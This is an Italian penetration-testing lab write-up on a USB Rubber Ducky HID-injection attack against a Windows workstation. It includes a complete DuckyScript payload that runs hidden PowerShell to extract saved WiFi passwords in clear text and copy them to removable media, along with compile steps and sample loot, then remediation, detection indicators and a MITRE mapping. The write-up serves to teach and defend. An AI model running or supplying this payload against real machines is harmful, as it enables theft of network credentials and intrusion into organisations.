> [English](README.en.md) | **Italiano**

# USB Rubber Ducky - HID Attack Fisico

> - **Fase:** Social Engineering - Physical Payload Delivery via HID Injection
> - **Visibilita:** Bassa per il sistema (il dispositivo appare come una tastiera legittima, nessun driver sospetto); Alta per l'utente presente (lo schermo mostra finestre che si aprono rapidamente) ma la velocita di esecuzione (< 30 secondi) limita la finestra di intervento
> - **Prerequisiti:** Hardware Hak5 USB Rubber Ducky (o emulatore: Digispark ATtiny85, Teensy, Raspberry Pi Pico con CircuitPython); accesso fisico alla macchina target (anche momentaneo); conoscenza DuckyScript per la scrittura del payload
> - **Output:** SE-010 (esfiltrazione credenziali WiFi salvate in < 30 secondi tramite HID injection - severity Alto)

- **Ambiente Operativo:** Hak5 USB Rubber Ducky (Attaccante), Windows 10 VM (Vittima)
- **Target:** Workstation Windows con sessione utente attiva
- **Framework:** DuckyScript 3.0
- **Tecniche Documentate:** HID Injection, Keystroke Automation, WiFi Credential Extraction

---

## Executive Summary

Il USB Rubber Ducky e un dispositivo di attacco fisico che sfrutta il modello di fiducia implicita dei sistemi operativi verso i dispositivi HID (Human Interface Device). Quando il Rubber Ducky viene inserito in una porta USB, il sistema lo identifica come una tastiera - un tipo di dispositivo che tutti i sistemi operativi accettano senza autenticazione, driver aggiuntivi o conferma dell'utente. Il dispositivo esegue quindi un payload DuckyScript che inietta sequenze di tasti a velocita sovraumana (millisecondi per carattere), eseguendo comandi nel contesto dell'utente loggato.

Il laboratorio ha documentato un payload che estrae tutte le credenziali WiFi salvate su un sistema Windows in meno di 30 secondi - dal momento dell'inserimento USB al completamento dell'esfiltrazione. Questa velocita rende l'attacco praticabile in scenari di accesso fisico brevissimo (passaggio in un ufficio, accesso a una reception incustodita).

---

## USB Rubber Ducky: Esfiltrazione Credenziali WiFi

**ID Finding:** `SE-010` | **Severity:** `Alto`

### Contesto operativo

Lo scenario simula un attaccante con accesso fisico momentaneo a una workstation Windows con sessione utente attiva. L'attaccante inserisce il Rubber Ducky nella porta USB, il payload si esegue automaticamente, e le credenziali WiFi vengono estratte e salvate in un file. L'intera operazione si completa in meno di 30 secondi.

### PoC - Fase 1: Scrittura Payload DuckyScript

```Bash
# Payload DuckyScript: esfiltrazione WiFi passwords (Windows)
# File: wifi_dump.txt

REM USB Rubber Ducky - WiFi Credential Extraction
REM Target: Windows 10/11 con sessione utente attiva
REM Tempo di esecuzione: < 30 secondi

DELAY 1000
REM Apertura PowerShell nascosto
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

REM Estrazione profili WiFi e password in chiaro
STRING $out = @(); (netsh wlan show profiles) | Select-String ':(.+)$' | ForEach-Object {$name = $_.Matches.Groups[1].Value.Trim(); $out += "=== $name ==="; $details = netsh wlan show profile name="$name" key=clear; $key = ($details | Select-String 'Key Content\s*:\s*(.+)$'); if($key){$out += "Password: " + $key.Matches.Groups[1].Value} else {$out += "Password: (none)"}}; $out | Out-File "$env:TEMP\wifi_creds.txt"
ENTER
DELAY 3000

REM Esfiltrazione: copia su dispositivo rimovibile (alternativa: POST HTTP)
STRING Copy-Item "$env:TEMP\wifi_creds.txt" "$(Get-WmiObject Win32_Volume | Where-Object {$_.DriveType -eq 2} | Select-Object -First 1 -ExpandProperty DriveLetter)\loot.txt" -ErrorAction SilentlyContinue; Remove-Item "$env:TEMP\wifi_creds.txt"; exit
ENTER
```

### PoC - Fase 2: Compilazione e Caricamento

```Bash
# Compilazione DuckyScript (con encoder Java o DuckToolkit)
java -jar duckencoder.jar -i wifi_dump.txt -o inject.bin -l it
# -l it: layout tastiera italiana

# Il file inject.bin viene caricato sulla microSD del Rubber Ducky
# Inserire la microSD nel Rubber Ducky -> pronto per l'uso
```

### PoC - Fase 3: Esecuzione e Risultato

```
# Inserimento Rubber Ducky nella porta USB:
# t=0s    - USB riconosciuto come tastiera HID
# t=1s    - DELAY iniziale
# t=1.5s  - Win+R apre finestra "Esegui"
# t=2s    - PowerShell si avvia (finestra nascosta)
# t=3s    - Script di estrazione WiFi in esecuzione
# t=25s   - File wifi_creds.txt generato
# t=28s   - File copiato su dispositivo rimovibile
# t=30s   - Cleanup e uscita                                <-- SE-010: completato in < 30s

# Contenuto di loot.txt (file esfiltrato):
=== WiFi-Ufficio ===
Password: C0mpany2026!WiFi                                  <-- credenziale WiFi aziendale
=== WiFi-Guest ===
Password: Guest2026
=== Home-Network ===
Password: MyH0meP4ss!                                       <-- credenziale WiFi personale
```

### Remediation

- **Azione immediata:** cambio password di tutte le reti WiFi le cui credenziali sono state esfiltrate; audit dei dispositivi USB collegati nelle ultime 24 ore (Event ID 6416 - PnP activity); verifica nei log PowerShell per comandi `netsh wlan` anomali
- **Azione strutturale:** implementazione USB Device Control via endpoint protection (whitelist di dispositivi autorizzati per vendor ID/product ID); disabilitazione PowerShell per utenti standard o enforcement Constrained Language Mode; deploy di soluzioni DLP (Data Loss Prevention) che monitorano la copia di file su dispositivi rimovibili; policy di sicurezza fisica: lock screen obbligatorio (GPO timeout schermo), policy "clean desk"
- **Verifica:** inserimento di un Rubber Ducky di test - il device control deve bloccare l'enumerazione del dispositivo o la soluzione DLP deve impedire la copia dei file

---

## Esperienza di Laboratorio

Il test e stato condotto con un Hak5 USB Rubber Ducky (hardware reale) su una VM Windows 10 con sessione utente attiva. La prima versione del payload utilizzava `cmd.exe` con `netsh wlan show profiles` e pipe, ma la complessita dei comandi cmd con pipe e for loop causava errori di timing (caratteri persi quando la VM era sotto carico). Il passaggio a PowerShell one-liner ha risolto il problema: un singolo comando PS gestisce l'intera logica senza dipendenze di timing tra comandi multipli.

La sfida principale e stata il layout della tastiera: il Rubber Ducky inietta keystroke basandosi sulla mappatura tastiera specificata durante la compilazione. Con layout italiano (`-l it`), i caratteri speciali come `|`, `@`, `{`, `}` vengono mappati correttamente. Un payload compilato con layout US su un sistema con tastiera italiana genera caratteri errati (es. `\` al posto di `|`), causando il fallimento dello script.

Il tempo totale di esecuzione (28 secondi) include un DELAY conservativo di 3 secondi per l'estrazione WiFi. In un test successivo con DELAY ridotto a 1.5 secondi, il payload ha completato in 18 secondi - ma con rischio di race condition se il sistema e lento. Il bilanciamento tra velocita e affidabilita e una considerazione chiave nella scrittura di payload DuckyScript.

---

## Analisi Teorica: Il Modello di Fiducia HID

I sistemi operativi moderni implementano meccanismi di autenticazione e autorizzazione sofisticati per software, rete e utenti. Tuttavia, i dispositivi HID (tastiere, mouse) godono di un modello di fiducia implicita: qualsiasi dispositivo che si identifichi come tastiera USB (USB Class 03h, Subclass 01h, Protocol 01h) viene accettato e attivato istantaneamente, senza driver aggiuntivi, senza conferma dell'utente, e senza alcun controllo di integrita.

Questo modello di fiducia e una necessita funzionale: le tastiere devono funzionare prima che qualsiasi software di sicurezza sia caricato (per inserire password di login, accedere al BIOS, gestire prompt di sicurezza). Il Rubber Ducky sfrutta esattamente questa necessita: il firmware del dispositivo emula i descriptor USB di una tastiera standard, rendendo impossibile per il sistema operativo distinguerlo da una tastiera legittima basandosi solo sui metadati USB.

La difesa deve quindi operare a livello piu alto: USB Device Control (whitelist basata su VendorID/ProductID/SerialNumber), che blocca l'enumerazione di dispositivi HID non autorizzati. Soluzioni avanzate come Microsoft Defender for Endpoint implementano anche il monitoraggio comportamentale: una tastiera che inietta 500 caratteri al secondo con precisione perfetta e statisticamente distinguibile da un utente umano.

---

## Scenario Reale: Proiezione Post-Exploitation

> Questa sezione descrive come questo finding si inserirebbe in un engagement reale.

### Prospettiva Attaccante (Red Team)

**Punto di partenza:** credenziali WiFi aziendali esfiltrate (SE-010).

**Kill Chain proiettata:**

```
[SE-010] Credenziali WiFi esfiltrate
        |
        v
Accesso alla rete WiFi aziendale da postazione non autorizzata (parcheggio)
        |
        v
Network scanning -> identificazione host e servizi interni
        |
        v
Exploitation di servizi interni non esposti su Internet
        |
        v
Lateral Movement -> Domain compromise
```

### Prospettiva Difensore (Blue Team)

**IOC da monitorare:**
- Event ID 6416: nuovo dispositivo PnP connesso (HID keyboard da vendor non noto)
- PowerShell Script Block Log con comandi `netsh wlan`
- Copia di file verso drive rimovibili (DLP event)
- Accesso WiFi da MAC address non inventariato

**Hardening:**
- USB Device Control con whitelist hardware
- WiFi: 802.1X con certificati (non PSK) per rete corporate
- Segmentazione WiFi: rete guest isolata
- Lock screen automatico dopo 60 secondi di inattivita

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Initial Access | Replication Through Removable Media | `T1091` | Inserimento USB Rubber Ducky nella workstation target |
| Execution | User Execution: Malicious File | `T1204.002` | Il payload DuckyScript si esegue automaticamente all'inserimento (SE-010) |
| Execution | Command and Scripting Interpreter: PowerShell | `T1059.001` | PowerShell one-liner per estrazione credenziali WiFi |
| Credential Access | Credentials from Password Stores: Windows Credential Manager | `T1555.004` | Estrazione password WiFi salvate via `netsh wlan show profile key=clear` |
| Collection | Input Capture: Credential API Hooking | `T1056.004` | HID injection simula input tastiera per esecuzione comandi |
| Exfiltration | Exfiltration Over Physical Medium: Exfiltration over USB | `T1052.001` | Copia del file con credenziali su dispositivo rimovibile |
| Discovery | System Information Discovery | `T1082` | Enumerazione profili WiFi e configurazione di rete |

---

> **Nota:** Tutte le attivita documentate sono state condotte in un ambiente di laboratorio virtualizzato. Il Rubber Ducky e stato utilizzato esclusivamente su macchine virtuali di proprieta dell'autore. Le credenziali WiFi esfiltrate erano di reti di test create ad hoc.
